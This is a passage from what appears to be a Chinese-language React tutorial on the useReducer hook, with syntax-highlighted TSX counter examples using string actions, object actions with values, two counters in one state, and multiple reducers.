class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#x27;decrement&#x27;)&#125;</span><br><span class="language-xml">      &gt;Decrement<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#x27;reset&#x27;)&#125;</span><br><span class="language-xml">      &gt;Reset<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">CounterOne</span><br></code></pre></td></tr></table></figure><p>reducer function 的2个参数，分别为当前 state 和 action， 并根据不同的 action 返回不同的新的 state。</p><p>useReducer 返回了一个数组，2个元素分别为 state 和 dispatch 方法。其中 state 在我们的例子中就是当前的 count 值，dispatch 方法接受一个参数，执行对应的 action。dispatch 执行后，对应的 state 会改变，组件会 rerender，来展示最新的状态。</p><p>App.tsx</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./App.css&#x27;</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">CounterOne</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/19CounterOne&#x27;</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;App&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">CounterOne</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span><br></code></pre></td></tr></table></figure><hr><p>complex state &amp; action</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useReducer &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">const</span> initialState = &#123;<br>  <span class="hljs-attr">firstCounter</span>: <span class="hljs-number">0</span><br>&#125;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">reducer</span> = (<span class="hljs-params"></span><br><span class="hljs-params">  state: &#123;</span><br><span class="hljs-params">    firstCounter: <span class="hljs-built_in">number</span></span><br><span class="hljs-params">  &#125;,</span><br><span class="hljs-params">  action: &#123;</span><br><span class="hljs-params">    <span class="hljs-keyword">type</span>: <span class="hljs-built_in">string</span></span><br><span class="hljs-params">  &#125;</span><br><span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;increment&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-attr">firstCounter</span>: state.<span class="hljs-property">firstCounter</span> + <span class="hljs-number">1</span><br>      &#125;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;decrement&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-attr">firstCounter</span>: state.<span class="hljs-property">firstCounter</span> - <span class="hljs-number">1</span><br>      &#125;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;reset&#x27;</span>:<br>      <span class="hljs-keyword">return</span> initialState<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">return</span> state<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">CounterTwo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, dispatch] = <span class="hljs-title function_">useReducer</span>(reducer, initialState)<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Count - &#123;count.firstCounter&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123; type: &#x27;increment&#x27; &#125;)&#125;</span><br><span class="language-xml">      &gt;Increment<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123; type: &#x27;decrement&#x27; &#125;)&#125;</span><br><span class="language-xml">      &gt;Decrement<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123; type: &#x27;reset&#x27; &#125;)&#125;</span><br><span class="language-xml">      &gt;Reset<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">CounterTwo</span><br></code></pre></td></tr></table></figure><p>与上一节的示例效果相同。现在，我们已经将 state 和 action 都改写为对象了，那么这样写有什么好处呢？</p><p>其一的好处是 action 现在是一个对象了，可以有多个属性决定 action 的效果。例如我们再添加一个 +5 的逻辑。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useReducer &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">const</span> initialState = &#123;<br>  <span class="hljs-attr">firstCounter</span>: <span class="hljs-number">0</span><br>&#125;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">reducer</span> = (<span class="hljs-params"></span><br><span class="hljs-params">  state: &#123;</span><br><span class="hljs-params">    firstCounter: <span class="hljs-built_in">number</span></span><br><span class="hljs-params">  &#125;,</span><br><span class="hljs-params">  action: &#123;</span><br><span class="hljs-params">    <span class="hljs-keyword">type</span>: <span class="hljs-built_in">string</span></span><br><span class="hljs-params">    value: <span class="hljs-built_in">number</span></span><br><span class="hljs-params">  &#125;</span><br><span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;increment&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-attr">firstCounter</span>: state.<span class="hljs-property">firstCounter</span> + action.<span class="hljs-property">value</span><br>      &#125;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;decrement&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-attr">firstCounter</span>: state.<span class="hljs-property">firstCounter</span> - action.<span class="hljs-property">value</span><br>      &#125;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;reset&#x27;</span>:<br>      <span class="hljs-keyword">return</span> initialState<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">return</span> state<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">CounterTwo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, dispatch] = <span class="hljs-title function_">useReducer</span>(reducer, initialState)<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Count - &#123;count.firstCounter&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123;</span><br><span class="language-xml">          type: &#x27;increment&#x27;,</span><br><span class="language-xml">          value: 1</span><br><span class="language-xml">        &#125;)&#125;</span><br><span class="language-xml">      &gt;Increment<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123;</span><br><span class="language-xml">          type: &#x27;decrement&#x27;,</span><br><span class="language-xml">          value: 1</span><br><span class="language-xml">        &#125;)&#125;</span><br><span class="language-xml">      &gt;Decrement<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123;</span><br><span class="language-xml">          type: &#x27;increment&#x27;,</span><br><span class="language-xml">          value: 5</span><br><span class="language-xml">        &#125;)&#125;</span><br><span class="language-xml">      &gt;Increment 5<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123;</span><br><span class="language-xml">          type: &#x27;decrement&#x27;,</span><br><span class="language-xml">          value: 5</span><br><span class="language-xml">        &#125;)&#125;</span><br><span class="language-xml">      &gt;Decrement 5<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123; type: &#x27;reset&#x27;, value: 0&#125;)&#125;</span><br><span class="language-xml">      &gt;Reset<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">CounterTwo</span><br></code></pre></td></tr></table></figure><p>可以注意到给 action 增加了一个 value 属性，实现了加减 5 的逻辑。</p><p>第二个好处是 state 作为一个对象，就可以添加更多的 state 属性，例如我们在增加一个计数器2，代码如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useReducer &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">const</span> initialState = &#123;<br>  <span class="hljs-attr">firstCounter</span>: <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">secondCounter</span>: <span class="hljs-number">10</span>,<br>&#125;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">reducer</span> = (<span class="hljs-params"></span><br><span class="hljs-params">  state: &#123;</span><br><span class="hljs-params">    firstCounter: <span class="hljs-built_in">number</span></span><br><span class="hljs-params">    secondCounter: <span class="hljs-built_in">number</span></span><br><span class="hljs-params">  &#125;,</span><br><span class="hljs-params">  action: &#123;</span><br><span class="hljs-params">    <span class="hljs-keyword">type</span>: <span class="hljs-built_in">string</span></span><br><span class="hljs-params">    value: <span class="hljs-built_in">number</span></span><br><span class="hljs-params">  &#125;</span><br><span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;increment&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123;<br>        ...state,<br>        <span class="hljs-attr">firstCounter</span>: state.<span class="hljs-property">firstCounter</span> + action.<span class="hljs-property">value</span><br>      &#125;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;decrement&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123;<br>        ...state,<br>        <span class="hljs-attr">firstCounter</span>: state.<span class="hljs-property">firstCounter</span> - action.<span class="hljs-property">value</span><br>      &#125;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;increment2&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123;<br>        ...state,<br>        <span class="hljs-attr">secondCounter</span>: state.<span class="hljs-property">secondCounter</span> + action.<span class="hljs-property">value</span><br>      &#125;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;decrement2&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123;<br>        ...state,<br>        <span class="hljs-attr">secondCounter</span>: state.<span class="hljs-property">secondCounter</span> - action.<span class="hljs-property">value</span><br>      &#125;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;reset&#x27;</span>:<br>      <span class="hljs-keyword">return</span> initialState<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">return</span> state<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">CounterTwo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, dispatch] = <span class="hljs-title function_">useReducer</span>(reducer, initialState)<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>First Count - &#123;count.firstCounter&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Second Count - &#123;count.secondCounter&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123;</span><br><span class="language-xml">          type: &#x27;increment&#x27;,</span><br><span class="language-xml">          value: 1</span><br><span class="language-xml">        &#125;)&#125;</span><br><span class="language-xml">      &gt;Increment<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123;</span><br><span class="language-xml">          type: &#x27;decrement&#x27;,</span><br><span class="language-xml">          value: 1</span><br><span class="language-xml">        &#125;)&#125;</span><br><span class="language-xml">      &gt;Decrement<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123;</span><br><span class="language-xml">          type: &#x27;increment&#x27;,</span><br><span class="language-xml">          value: 5</span><br><span class="language-xml">        &#125;)&#125;</span><br><span class="language-xml">      &gt;Increment 5<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123;</span><br><span class="language-xml">          type: &#x27;decrement&#x27;,</span><br><span class="language-xml">          value: 5</span><br><span class="language-xml">        &#125;)&#125;</span><br><span class="language-xml">      &gt;Decrement 5<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123;</span><br><span class="language-xml">            type: &#x27;increment2&#x27;,</span><br><span class="language-xml">            value: 1</span><br><span class="language-xml">          &#125;)&#125;</span><br><span class="language-xml">        &gt;Increment second<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123;</span><br><span class="language-xml">            type: &#x27;decrement2&#x27;,</span><br><span class="language-xml">            value: 1</span><br><span class="language-xml">          &#125;)&#125;</span><br><span class="language-xml">        &gt;Decrement second<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123; type: &#x27;reset&#x27;, value: 0 &#125;)&#125;</span><br><span class="language-xml">      &gt;Reset<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">CounterTwo</span><br></code></pre></td></tr></table></figure><p>这样我们就能同时维护 2 个计时器。</p><hr><p>multiple useReducers：如果有多个 state，但 state 变化的方式又是相同的时候，可以多次使用 useReducer。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useReducer &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">const</span> initialState = <span class="hljs-number">0</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">reducer</span> = (<span class="hljs-params">state: <span class="hljs-built_in">number</span>, action: <span class="hljs-built_in">string</span></span>) =&gt; &#123;<br>  <span class="hljs-keyword">switch</span> (action) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;increment&#x27;</span>:<br>      <span class="hljs-keyword">return</span> state + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;decrement&#x27;</span>:<br>      <span class="hljs-keyword">return</span> state - <span class="hljs-number">1</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;reset&#x27;</span>:<br>      <span class="hljs-keyword">return</span> initialState<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">return</span> state<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">CounterThree</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, dispatch] = <span class="hljs-title function_">useReducer</span>(reducer, initialState)<br>  <span class="hljs-keyword">const</span> [countTwo, dispatchTwo] = <span class="hljs-title function_">useReducer</span>(reducer, initialState)<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Count - &#123;count&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#x27;increment&#x27;)&#125;</span><br><span class="language-xml">      &gt;Increment<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#x27;decrement&#x27;)&#125;</span><br><span class="language-xml">      &gt;Decrement<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#x27;reset&#x27;)&#125;</span><br><span class="language-xml">      &gt;Reset<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>CountTwo - &#123;countTwo&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatchTwo(&#x27;increment&#x27;)&#125;</span><br><span class="language-xml">      &gt;Increment<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatchTwo(&#x27;decrement&#x27;)&#125;</span><br><span class="language-xml">      &gt;Decrement<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatchTwo(&#x27;reset&#x27;)&#125;</span><br><span class="language-xml">      